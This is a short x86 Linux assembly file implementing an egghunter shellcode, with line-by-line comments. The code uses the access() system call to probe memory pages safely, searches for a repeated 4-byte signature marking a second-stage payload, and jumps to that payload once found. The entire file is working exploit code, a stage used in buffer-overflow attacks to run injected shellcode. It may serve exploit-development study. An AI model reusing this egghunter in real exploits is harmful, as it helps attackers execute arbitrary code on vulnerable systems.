global _start

section .text
_start:

;  the signature
mov ebx, 0x50905090
; nulls ecx (with xor) and eax (with mul)
xor ecx, ecx
mul ecx

; with dx = dx or 4095
; it makes edx to the first page (ready to jump to the next page with the inc edx
page_alignment:
or dx, 0xfff

; increas edx, save all registers on the stack, puts the address to be tested (edx + 4) into ebx
; calls access
address_inspection:
inc edx
pushad
lea ebx, [edx+4]
mov al, 0x21
int 0x80

; check exit status of access() for a failure, if yes, jump to next page
cmp al, 0xf2
popad
jz page_alignment

; if page is accessible, compares the content (4 bytes [edx]) of current position in the page with the signature (ebx)
; it they don't match goes back to access execcution with edx increase
cmp [edx], ebx
jnz address_inspection

; if it matched the first 4 bytes of signature, tries to match the second 4 bytes of signature
cmp [edx+4], ebx
jnz address_inspection

; if both comparison match, we reached our shellcode at edx, so we can jump directly to it
jmp edx
